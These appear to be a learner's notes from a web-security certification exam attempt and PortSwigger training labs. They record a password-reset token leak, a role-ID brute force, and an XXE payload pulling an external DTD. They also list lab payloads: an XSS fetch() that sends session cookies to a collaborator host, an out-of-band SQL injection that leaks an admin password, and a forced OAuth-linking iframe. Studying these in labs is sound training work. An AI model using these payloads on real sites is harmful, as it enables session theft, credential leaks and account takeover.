# Exam Attempt 1
Both the applications had a user login page, and user can request the ability to request to forgot password
## Application 2
### Stage1 crack
Getting access to carlos user
Updating the headers while requesting the forgot user got the forgot password token to the exploit server logs.
Had the following request in the access logs
/refresh-password?temp-forgot-password-token=4t7zycsb14jvm4a300bii5ofukw0h8pr
Just used the parent url and created the end point visited it and then updated the password to abcd to remember it
### Stage2 crack
Elevating the privige to admin
There was an endpoint to update the email which was sending json data, which consist of csrf and email address, and there was information like api key, user name, and roleid being returned, roleid was 30, i send that request to intruder and included roleid in the request as well and brute force the roleid to see if i can change it, i was able to change it to 50 and that roleid was of admin.
{
  "username": "administrator",
 "csrf":"9nyIPO8cqegYrLrr5UMrkIbymQrmO6ew","email":"test@exploit-0ac500ca03556da5806adeb301b70021.exploit-server.net",
"roleid":§4§
}
tried payloads from 0-100

### stage3 crack
Reading the text of file /home/carlos/secret
There there was a page for the admin to update or add more users, and it was through an xml file, we used the following payload to get the secret text into our collab server, where the dtd was used to retrieve the file and send it to collab server

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ac500ca03556da5806adeb301b70021.exploit-server.net/exploit.dtd"> %xxe;]>
<users>
    <user>
        <username>Example1</username>
        <email>user1@example.com</email>
    </user>
    <user>
        <username>Example2</username>
        <email>user2@example.com</email>
    </user>
</users>


## Application 2

I was not able to find much from the automated scanner, even with the manual testing, the surface to test were the following:
- forgotten password mechanism
- search button
- productid
- other data being sent by the user
Tested for different types of request smuggling attacks but there was no success.
Tested for CORS vulnerabilities by adding origin header but there was again no success.


## Next Attempt

After trying the payloads and also trying hacking techniques above try ssrf on localhost:6566
Try to inject a random cookie and see if that is being reflected anywhere, and also analyze the session cookie more
if that is giving more information
You were able to enumerate the user name through forget password mechanism, try that for password with every possible thing.

Also try clickjacking for this lab if there is a possibility
All the XSS will not be detected simply, try all possible tags with encoding if its not a straightforward exploit



## Recommended 10 labs

### Lab: Exploiting cross-site scripting to steal cookies


This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.  


Payload to use in the comment:

```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

```

### Lab: Blind SQL injection with out-of-band data exfiltration

Solved

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Payload inside the cookie:

```
TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.OASTIFY.COM/">+%25remote%3b]>'),'/l')+FROM+dual--
```


### Lab: Forced OAuth profile linking

Forced OAuth profile linking: Another way to exploit the OAuth, is to target CSRF, In the scenario we can attach our social media profile, whenever we attach it we will be provided with a code, so we will exploit that behavior, we will try to get the code and drop the request to forward the code. so that it is not used and then create an iframe for the victim to visit the outh-linking website so that admins profile is attached to our social media and then login with our social media and do the admis function. Lab: https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking.
 While proxying traffic through Burp, click "My account". You are taken to a normal login page, but notice that there is an option to log in using your social media profile instead. For now, just log in to the blog website directly using the classic login form.
Notice that you have the option to attach your social media profile to your existing account.
Click "Attach a social profile". You are redirected to the social media website, where you should log in using your social media credentials to complete the OAuth flow. Afterwards, you will be redirected back to the blog website.
Log out and then click "My account" to go back to the login page. This time, choose the "Log in with social media" option. Observe that you are logged in instantly via your newly linked social media account.
In the proxy history, study the series of requests for attaching a social profile. In the GET /auth?client_id[...] request, observe that the redirect_uri for this functionality sends the authorization code to /oauth-linking. Importantly, notice that the request does not include a state parameter to protect against CSRF attacks.
Turn on proxy interception and select the "Attach a social profile" option again.
Go to Burp Proxy and forward any requests until you have intercepted the one for GET /oauth-linking?code=[...]. Right-click on this request and select "Copy URL".
Drop the request. This is important to ensure that the code is not used and, therefore, remains valid.
Turn off proxy interception and log out of the blog website.

Go to the exploit server and create an iframe in which the src attribute points to the URL you just copied. The result should look something like this:
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
Now after sending this, login with social media account, you will then be able to see the admin panel
Lab: https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking


### Lab: Brute-forcing a stay-logged-in cookie

Testing stay-logged-in cookie and then trying to guess the cookie and then changing the username with the same cookie which coinsist username + hashofpassword
